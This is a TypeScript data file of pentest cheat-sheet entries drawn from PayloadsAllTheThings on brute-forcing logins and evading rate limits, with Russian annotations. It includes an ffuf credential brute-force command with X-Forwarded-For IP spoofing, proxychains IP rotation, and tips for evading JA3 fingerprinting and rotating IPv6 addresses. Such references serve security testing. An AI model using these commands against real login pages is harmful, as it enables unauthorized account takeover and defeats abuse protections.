import type { CuratedCategory } from './types';

// Source: PayloadsAllTheThings/Brute Force Rate Limit/README.md
// Convention: payloads/commands/code stay technical; titles, subcategories,
// tips/notes and config comments are in Russian.
export const bruteForceRateLimit: CuratedCategory = {
  category: 'Brute Force Rate Limit',
  source: 'PayloadsAllTheThings/Brute Force Rate Limit/README.md',
  entries: [
    {
      subcategory: 'Брутфорс',
      title: 'FFUF — брутфорс логина (user × pass + спуф IP)',
      language: 'bash',
      tags: ['ffuf', 'bruteforce', 'login'],
      body: `ffuf -w usernames.txt:USER -w passwords.txt:PASS \\
     -u https://target.tld/login \\
     -X POST -d "username=USER&password=PASS" \\
     -H "Content-Type: application/x-www-form-urlencoded" \\
     -H "X-Forwarded-For: FUZZ" -w ipv4-list.txt:FUZZ \\
     -mc all`,
    },
    {
      subcategory: 'Брутфорс',
      title: 'Burp Intruder — типы атак (шпаргалка)',
      language: 'text',
      tags: ['burp', 'intruder', 'bruteforce'],
      body: `Sniper         1 позиция, 1 набор — перебирает одну переменную.
Battering ram  один payload сразу во ВСЕ отмеченные позиции.
Pitchfork      несколько списков параллельно — n-й элемент из каждого (user[n]:pass[n]).
Cluster bomb   все комбинации наборов (user × pass).`,
    },
    {
      subcategory: 'Рейт-лимит · ротация IP',
      title: 'proxychains + ffuf — смена IP на каждый запрос',
      language: 'bash',
      tags: ['proxychains', 'rate-limit', 'ip-rotation', 'ffuf'],
      body: `proxychains ffuf -w wordlist.txt -u https://target.tld/FUZZ`,
    },
    {
      subcategory: 'Рейт-лимит · ротация IP',
      title: 'proxychains.conf — случайная ротация, 1 прокси в цепочке',
      language: 'ini',
      tags: ['proxychains', 'rate-limit', 'config'],
      body: `# /etc/proxychains.conf
random_chain        # менять прокси на каждый запрос
chain_len = 1       # ровно один прокси на соединение

[ProxyList]
# тип     хост               порт
socks5    127.0.0.1          1080
socks5    192.168.1.50       1080
http      proxy1.example.com 8080
http      proxy2.example.com 8080`,
    },
    {
      subcategory: 'Рейт-лимит',
      title: 'Обход рейт-лимита — IP, JA3 и IPv6',
      language: 'text',
      tags: ['rate-limit', 'ja3', 'ipv6', 'bypass'],
      body: `Спуф IP    ротация X-Forwarded-For / X-Real-IP через заголовок FUZZ (см. команду ffuf).
TLS / JA3  сервер фингерпринтит TLS-рукопожатие, даже если подменить User-Agent.
           Обходи через curl-impersonate или реальный браузер (Playwright/Puppeteer).
           Известные JA3 — Burp: 53d67b2a806147a7d1d5df74b54dd049 · Tor: e7d705a3286e19ea42f587b344ee6865
IPv6 /64   провайдеры (напр. Vultr) дают /64 (~1.8e19 адресов) для массовой ротации.
Тулзы      OmniProx (мульти-облачная ротация IP), ffuf, curl-impersonate.`,
    },
  ],
};
